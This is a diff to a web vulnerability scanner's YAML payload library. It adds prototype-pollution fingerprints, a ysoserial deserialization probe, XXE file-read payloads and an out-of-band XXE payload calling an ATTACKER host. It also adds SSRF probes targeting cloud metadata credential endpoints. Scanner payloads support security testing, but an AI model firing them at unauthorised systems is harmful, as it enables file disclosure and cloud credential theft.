@@ -1,3 +1,29 @@
+# P1-3 (2026-09-15)：Prototype Pollution gadget 指纹库。
+# 供 engines/web_advanced_engines.PrototypePollutionEngine 引用：
+# 已 verified 的原型污染若命中下列服务端框架/库指纹 → 升级为「gadget 链路可用」。
+pp_gadget_fingerprints:
+  frameworks:
+  - pattern: express
+    description: Express.js (Node) —— 查询串/JSON 体原型污染主战场
+  - pattern: node\.js
+    description: Node.js 运行时
+  - pattern: \bkoa\b
+    description: Koa (Node)
+  - pattern: lodash
+    description: lodash <4.17.21 存在 PP (CVE-2020-8203)，可经 template/merge gadget 升级
+  - pattern: \bjquery\b
+    description: jQuery <3.4.0 $.extend(true,...) PP (CVE-2019-11358)，可升级 XSS
+  - pattern: \bhandlebars\b
+    description: Handlebars PP 可 RCE (CVE-2021-23369)
+  - pattern: \bmustache\b
+    description: mustache 模板引擎 PP gadget
+  - pattern: \bvue\b
+    description: Vue.js —— PP 可影响模板编译
+  - pattern: \bmongoose\b
+    description: Mongoose —— PP 可影响查询条件
+  - pattern: \bmoment\b
+    description: moment.js PP gadget
+
 deserialization:
   java:
   - payload: '{"@type":"java.lang.Runtime","x":"x"}'
@@ -8,6 +34,14 @@ deserialization:
     description: Java 原生序列化 BLOB 探测
   - payload: "¬í\0\x05"
     description: Java 序列化魔数
+  - payload: rO0ABXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwPz9/AAAAAAAAeA==
+    description: ysoserial URLDNS DNS 回调探测
+  - payload: __gadget:CommonsCollections1__
+    description: ysoserial CommonsCollections1 指纹标记（网络 OOB 验证走引擎 _verify_harmless_gadget）
+  - payload: __gadget:JRMPClient__
+    description: ysoserial JRMPClient 指纹标记（JRMP 回调探测，OOB 验证走引擎 _verify_harmless_gadget）
+  - payload: __gadget:JdbcRowSet__
+    description: ysoserial JdbcRowSet 指纹标记（JDBC 源回连探测）
   php:
   - payload: O:8:"stdClass":0:{}
     description: PHP 序列化对象（无属性）
@@ -252,3 +286,25 @@ xss:
     description: body 事件触发
   - payload: <input onfocus=alert(1) autofocus>
     description: input 自动聚焦触发
+xxe:
+  file_disclosure:
+  - payload: '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
+    description: 经典外部实体文件读取 /etc/passwd
+  - payload: '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><foo>&xxe;</foo>'
+    description: Windows 文件读取 win.ini
+  - payload: '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://ATTACKER/evil.dtd"> %ext; ]><r></r>'
+    description: 外部 DTD 带外（OOB）XXE
+  - payload: '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>'
+    description: 参数实体内联读取（错误回显利用）
+ssrf:
+  internal_probe:
+  - payload: http://169.254.169.254/latest/meta-data/
+    description: AWS IMDSv1 元数据根
+  - payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    description: AWS IAM 临时凭证枚举
+  - payload: http://metadata.google.internal/computeMetadata/v1/
+    description: GCP 元数据根
+  - payload: http://127.0.0.1:80/
+    description: 回环地址探测
+  - payload: http://localhost:8080/
+    description: localhost 探测
